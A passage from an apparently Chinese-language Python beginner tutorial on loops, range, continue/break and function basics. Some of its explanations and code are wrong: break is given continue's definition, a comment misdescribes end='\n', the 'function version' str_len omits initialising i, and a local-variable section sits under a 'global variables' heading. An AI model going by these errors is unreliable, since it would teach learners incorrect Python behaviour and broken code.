&lt;= <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a=&quot;</span>,a)</span><br><span class="line">    b = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt;= <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;b=&quot;</span>,b)</span><br><span class="line">        b = b + <span class="number">1</span></span><br><span class="line">    a = a + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a= 1</span><br><span class="line">b= 1</span><br><span class="line">b= 2</span><br><span class="line">b= 3</span><br><span class="line">a= 2</span><br><span class="line">b= 1</span><br><span class="line">b= 2</span><br><span class="line">b= 3</span><br><span class="line">a= 3</span><br><span class="line">b= 1</span><br><span class="line">b= 2</span><br><span class="line">b= 3</span><br></pre></td></tr></table></figure><p>可以看到<code>a</code>的赋值没有直接从<code>1</code>变到<code>3</code>，而是在中间加入了<code>b</code>的循环，当<code>b</code>的循环结束后，才会执行a的循环</p><h1 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h1><p>除了while循环语句外，Python同样提供了for循环语句。两者能完成的功能基本差不多，但仍有一些区别:</p><ul><li>while循环的循环条件是自定义的，<span style="color:red">自行控制循环条件</span></li><li>for循环是一种<span style="color:red">“轮询”</span>机制，是对一批内容进行<span style="color:red">逐个处理</span></li></ul><blockquote><p>简单地说:</p><ul><li><code>while</code>循环不知道要循环多少次(自定义循环)</li><li><code>for</code>循环知道要循环多少次(数据集的大小)</li></ul></blockquote><h2 id="for循环基础语法"><a href="#for循环基础语法" class="headerlink" title="for循环基础语法"></a>for循环基础语法</h2><p>基本格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 待处理数据集:</span><br><span class="line">    代码块</span><br></pre></td></tr></table></figure><p>这里我们还是以一个简单的代码示例来展示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;python&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> name:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p</span><br><span class="line">y</span><br><span class="line">t</span><br><span class="line">h</span><br><span class="line">o</span><br><span class="line">n</span><br></pre></td></tr></table></figure><p>可以看出，for循环是将字符串的内容<span style="color:red">依次取出</span>。<br><br>所以，for循环也被称之为<span style="color:red">遍历循环</span>。<br><br>下附示意图:<br><img src="https://free.picui.cn/free/2025/06/17/685101b9cf0ab.png" alt="for循环示意图"></p><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>写一个“查询语句字母”的程序，要求如下：</p><ul><li>输入一个字符串</li><li>输出该字符串中<code>a</code>的数量</li></ul><details><summary>代码示例</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#让用户输入一个字符串</span></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入一个字符串：&quot;</span>)</span><br><span class="line"><span class="comment">#设置一个计数器</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="comment">#循环</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment">#判断</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">        <span class="comment">#计数器加1</span></span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line"><span class="comment">#输出计数器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;该字符串中a的数量为：&quot;</span>,count)</span><br></pre></td></tr></table></figure></details><h2 id="range语句"><a href="#range语句" class="headerlink" title="range语句"></a><span style="font-size: 24px; font-weight: bold;">range语句</span><br></h2><p>刚才我们学习了<code>for</code>循环，但后面的<code>待处理数据集</code>只能是<code>顺序类型</code></p><blockquote><p>顺序类型：<a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2string">字符串</a>、列表、元组、集合、字典等</p></blockquote><p><code>range</code>语句，可以帮助我们快速的获取一个数字序列</p><ul><li>语法1 <code>range(n)</code>，生成一个从0到n-1的数字序列</li><li>语法2 <code>range(m,n)</code>，生成一个从m到n-1的数字序列</li><li>语法3 <code>range(m,n,k)</code>，生成一个从m到n-1的数字序列，公差为k</li></ul><p>如下程序可验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)   <span class="comment">#end=&#x27;\n&#x27;的意思是不换行</span></span><br><span class="line"><span class="built_in">print</span>()               <span class="comment">#隔开两个输出结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">012</span><br><span class="line">12</span><br><span class="line">13579</span><br></pre></td></tr></table></figure><h2 id="for循环临时变量作用域"><a href="#for循环临时变量作用域" class="headerlink" title="for循环临时变量作用域"></a><span style="font-size: 24px; font-weight: bold;">for循环临时变量作用域</span><br></h2><p>上面提到了<a href="#for%E5%BE%AA%E7%8E%AF%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><code>for</code>循环的构型</a>，其中有<code>临时变量</code>这一部分。<br><br>那么我们能否在循环外访问到这个<code>临时变量</code>呢？<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>此时，编译器会出现警告<br><br><img src="https://free.picui.cn/free/2025/06/17/685108d6a304a.png" alt="警告文件"><br>但此时如果无视风险强制运行的话，也能运行的出来<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>可以看到，虽然临时变量<code>i</code>的作用域应该在<code>for</code>循环内，但是在循环外依然可以调用<br><br><span style="color:red">但是这种行为是很不推荐的！！！</span>正确写法如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span>       <span class="comment">#先初始化 i 再循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i=&quot;</span>,i)</span><br></pre></td></tr></table></figure><h3 id="for循环的嵌套"><a href="#for循环的嵌套" class="headerlink" title="for循环的嵌套"></a><span style="font-size: 24px; font-weight: bold;">for循环的嵌套</span><br></h3><p>这个板块和<a href="#%E5%B5%8C%E5%A5%97%E5%BA%94%E7%94%A8"><code>while</code>循环的嵌套</a>的内容相似，不再赘述，示例代码如下：<br></p><blockquote><p>以向小美表白的案例为例</p><ul><li>坚持表白100天</li><li>每天送花10束</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;今天是向小美表白的第<span class="subst">&#123;i&#125;</span>天，坚持.&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;送给小美的第<span class="subst">&#123;j&#125;</span>朵玫瑰花&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;小美，我喜欢你(第<span class="subst">&#123;i&#125;</span>天的表白结束)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i&#125;</span>天，表白成功&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="循环中断：continue-和-break"><a href="#循环中断：continue-和-break" class="headerlink" title="循环中断：continue 和 break"></a>循环中断：continue 和 break</h1><h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a><span style="font-size: 30px; font-weight: bold;">continue</span><br></h2><p><code>continue</code>关键字用于：中断本次循环，直接进入下一次循环<br><br><code>continue</code>可以用于：<code>for</code>循环和<code>while</code>循环，效果一致<br><br>现在以<code>for</code>循环为例：<br><br><img src="https://free.picui.cn/free/2025/06/17/68510edadd91b.png" alt="continue示意图"><br></p><ul><li>在循环内，遇到<code>continue</code>就结束当次循环，进行下一次，所以<code>语句2</code>是不会执行的<br></li><li>应用场景：在循环中，因某些原因，<span style="color:red">临时结束本次循环</span>。</li></ul><h2 id="break"><a href="#break" class="headerlink" title="break"></a><span style="font-size: 30px; font-weight: bold;">break</span><br></h2><p><code>break</code>关键字用于：中断本次循环，直接进入下一次循环<br><br><code>break</code>可以用于：<code>for</code>循环和<code>while</code>循环，效果一致<br><br>现在以<code>for</code>循环为例：<br><br><img src="https://free.picui.cn/free/2025/06/17/68511074e5126.png" alt="break示意图"><br></p><ul><li>在循环内，遇到<code>break</code>就结束循环，所以<code>语句2</code>是不会执行的<br></li><li>应用场景：在循环中，因某些原因，<span style="color:red">永久结束循环</span>。</li></ul><h1 id="Python函数"><a href="#Python函数" class="headerlink" title="Python函数"></a>Python函数</h1><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a><span style="font-size: 30px; font-weight: bold;">函数介绍</span><br></h2><p>函数：<code>组织好的</code>，<code>可重复使用的</code>，<code>实现特定功能</code>的<code>代码块</code><br><br>这么说可能有点抽象，那我们还是结合代码来解释一下：<br></p><ul><li>假如我想写一个程序，分析用户输入字符串的长度</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;python&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串的长度为：&quot;</span>,i)</span><br></pre></td></tr></table></figure><ul><li>此时我们发现，若只有一个字符串，这个代码还是可以完全胜任的，但若是有多个字符串，并需要分别输出对应的长度，就要重复这个代码多次，使得程序变得庞大，不利于运行和维护</li></ul><p>所以我们可以来定义一个函数，代表这个重复部分的代码（<strong>封装重复代码</strong>），从而简化代码的编写：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">str_len</span>(<span class="params"><span class="built_in">str</span></span>):   <span class="comment">#定义一个函数 ~ def 函数名(参数): ~ str为传进来的参数</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;字符串的长度为：&quot;</span>,i)</span><br></pre></td></tr></table></figure><p>此时，我们来比较传统写法和这种写法：</p><figure class="highlight python"><figcaption><span>传统写法</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">str1 = <span class="string">&quot;python&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;python is a programming language&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> str1:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串的长度为：&quot;</span>,i)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> str2:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串的长度为：&quot;</span>,i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>函数写法</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&quot;python&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;python is a programming language&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_len</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;字符串的长度为：&quot;</span>,i)</span><br><span class="line">str_len(str1)</span><br><span class="line">str_len(str2)</span><br></pre></td></tr></table></figure><p>不难发现，函数写法在行数上都比传统写法省了好多，那运行速度和可读性肯定更高啦~</p><h2 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a><span style="font-size: 30px; font-weight: bold;">函数的定义</span><br></h2><p>定义语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>(<span class="params">参数</span>):</span><br><span class="line">    函数体</span><br><span class="line">    <span class="keyword">return</span> 返回值</span><br></pre></td></tr></table></figure><p>调用参数的时候，需要按照以下格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名(参数)</span><br></pre></td></tr></table></figure><h3 id="函数的传入参数"><a href="#函数的传入参数" class="headerlink" title="函数的传入参数"></a><span style="font-size: 24px; font-weight: bold;">函数的传入参数</span><br></h3><p>传入参数的功能是：在函数进行计算的时候，接受外部(调用时)提供的数据<br><br>下面是一个简单函数：<br></p><figure class="highlight python"><figcaption><span>简单函数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    i = <span class="number">1</span> + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>我们无论在什么时候调用这个函数，输出的结果永远是<code>1 + 2</code>的，但如果我想用该函数计算别的数值，那么就需要传入参数来辅助<br></p><figure class="highlight python"><figcaption><span>传参函数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>):</span><br><span class="line">    i = a + b</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>此时，我们这个函数计算的是<code>a + b</code>的值，而<code>a</code>和<code>b</code>两个值是从调用函数时传入的参数得到的<br></p><figure class="highlight python"><figcaption><span>调用传参函数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>):</span><br><span class="line">    i = a + b</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">7</span><br></pre></td></tr></table></figure><p>可以看到，我们传入的参数分别是<code>1</code>和<code>2</code>，<code>3</code>和<code>4</code>，所以输出的结果是<code>3</code>和<code>7</code>，而非固定值，加大了函数的可操作性<br></p><ul><li>形式参数(形参)函数定义中，提供的<code>a</code>和<code>b</code>，称之为:<strong>形式参数（形参）</strong>，表示函数声明将要使用2个参数<ul><li><strong>参数之间使用逗号进行分隔</strong></li></ul></li><li>函数调用中，提供的<code>1</code>和<code>2</code>，称之为:<strong>实际参数(实参)</strong>，表示函数执行时真正使用的参数值<ul><li><strong>传入的时候，按照顺序传入数据，使用逗号分隔</strong></li></ul></li></ul><h4 id="代码实践-4"><a href="#代码实践-4" class="headerlink" title="代码实践"></a><span style="font-size: 24px; font-weight: bold;">代码实践</span><br></h4><p>写一个“判断体温是否正常”的程序，要求如下：</p><ul><li>定义一个函数，名称任意</li><li>接受一个参数传入（数字类型，表示体温）</li><li>在函数内进行体温判断(正常范围小于等于37.5度)</li><li>若体温正常，则输出“体温正常”</li><li>若体温异常，则输出“体温异常”</li></ul><details><summary>代码示例</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#写一个判断体温的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">37.5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;温度异常&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;温度正常&quot;</span>)</span><br><span class="line"><span class="comment">#让用户输入自己的温度</span></span><br><span class="line">x = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;你的温度是：&quot;</span>))</span><br><span class="line"><span class="comment">#调用temp函数判断</span></span><br><span class="line">temp(x)</span><br></pre></td></tr></table></figure></details><h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a><span style="font-size: 30px; font-weight: bold;">函数的返回值</span><br></h3><h4 id="函数返回值的定义语法"><a href="#函数返回值的定义语法" class="headerlink" title="函数返回值的定义语法"></a><span style="font-size: 24px; font-weight: bold;">函数返回值的定义语法</span><br></h4><p>程序中的返回值，在生活中可以有很多例子来表示，例如：<br></p><ul><li>我让小明给我买3瓶可乐</li><li>小明买可乐</li><li>小明给我三瓶可乐</li></ul><p>其中，<code>小明给我三瓶可乐</code>，就是返回值<br><br>在函数中，返回值是这样的：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>):</span><br><span class="line">    result = a + b</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">i = add(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><ul><li><code>return</code>的作用：<br><ul><li>结束函数的执行</li><li>把返回值返回给调用者【在这个程序中，相当于使<code>i = add(1,2) = result</code>】</li></ul></li><li>函数体中，<code>return</code>后的语句不会执行</li></ul><h4 id="函数返回值的None类型"><a href="#函数返回值的None类型" class="headerlink" title="函数返回值的None类型"></a><span style="font-size: 24px; font-weight: bold;">函数返回值的<code>None</code>类型</span><br></h4><ul><li><code>None</code>类型表示什么都没有</li><li><code>None</code>和<code>0</code>是不同的</li><li><code>return</code>如果不返回任何数据，就会返回<code>None</code></li><li>函数体中没有<code>return</code>，默认返回<code>None</code></li></ul><p>None作为一个特殊的字面量，用于表示:空、无意义，其有非常多的应用场景。</p><ul><li>用在函数无返回值上（函数只干活，不需要返回值）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>):</span><br><span class="line">    result = a + b</span><br><span class="line">    <span class="built_in">print</span>(result)   <span class="comment">#直接打印 result 不需要返回</span></span><br></pre></td></tr></table></figure><ul><li>用在if判断上<ul><li><strong>在if判断中，None等同于False</strong></li><li><strong>一般用于在函数中主动返回None，配合if判断做相关处理</strong></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#检测是否成年</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">age_check</span>(<span class="params">age</span>):</span><br><span class="line">    <span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;SUCCESS&quot;</span>    <span class="comment">#成年返回 SUCCESS</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>         <span class="comment">#未成年返回 None</span></span><br><span class="line"></span><br><span class="line">result = age_check(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> result:              <span class="comment">#如果未成年 not None == True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未成年&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>用于声明无内容的变量上<ul><li><strong>定义变量，但暂时不需要变量有具体值，可以用None来代替</strong></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#暂不赋予具体变量</span></span><br><span class="line">x = <span class="literal">None</span></span><br></pre></td></tr></table></figure><h2 id="函数说明文档"><a href="#函数说明文档" class="headerlink" title="函数说明文档"></a><span style="font-size: 24px; font-weight: bold;">函数说明文档</span><br></h2><p>函数是纯代码语言，想要理解其含义，就需要一行行的去阅读理解代码，效率比较低<br><br>我们可以给函数添加说明文档，辅助理解函数的作用<br><br>语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>(<span class="params">参数<span class="number">1</span>,参数<span class="number">2</span>,参数<span class="number">3.</span>..</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    函数说明文档</span></span><br><span class="line"><span class="string">    :param 参数1: 说明参数1的作用</span></span><br><span class="line"><span class="string">    :param 参数2: 说明参数2的作用</span></span><br><span class="line"><span class="string">    :param 参数3: 说明参数3的作用</span></span><br><span class="line"><span class="string">    :return: 说明返回值的作用</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    函数体</span><br><span class="line">    <span class="keyword">return</span> 返回值</span><br></pre></td></tr></table></figure><p>通过<code>多行注释</code>的形式，对函数进行说明解释</p><ul><li>内容应写在函数体之前</li></ul><h2 id="函数的嵌套调用"><a href="#函数的嵌套调用" class="headerlink" title="函数的嵌套调用"></a><span style="font-size: 30px; font-weight: bold;">函数的嵌套调用</span><br></h2><p>到目前为止，我们已经学过两个嵌套调用了，想必也是对嵌套调用比较熟悉<br><br>函数的嵌套调用，顾名思义，一个函数套一个函数呗<br><br>示例代码如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是函数B&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是函数A&quot;</span>)</span><br><span class="line">    func_b()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是函数A&quot;</span>)</span><br><span class="line"></span><br><span class="line">func_a()</span><br></pre></td></tr></table></figure><ul><li>函数嵌套调用的执行流程<ul><li>调用函数A</li><li>函数A执行到<code>func_b()</code>，发现有函数B，于是暂停A的执行，转而去执行函数B</li><li>函数B执行完，返回函数A，从暂停的位置继续执行</li><li>函数A执行完</li></ul></li></ul><p>运行结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我是函数A</span><br><span class="line">我是函数B</span><br><span class="line">我是函数A</span><br></pre></td></tr></table></figure><h2 id="函数中变量的作用域"><a href="#函数中变量的作用域" class="headerlink" title="函数中变量的作用域"></a>函数中变量的作用域</h2><p><span style="color:red">变量作用域</span>：指的是变量的作用范围(变量在哪里可用，在哪里不可用)<br><br>主要分为两类：<span style="color:red">局部变量</span>和<span style="color:red">全局变量</span></p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a><span style="font-size: 24px; font-weight: bold;">全局变量</span><br></h3><p>定义在函数体内部的变量，<span style="color:red">仅在函数内部生效</span>（作用域在函数内）<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    </span><br><span class="line">func1()     <span class="comment"># 10</span></span><br><span class="line">func2()     <span class="comment"># 报错:name &#x27;a&#x27; is not defined</span></span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment"># 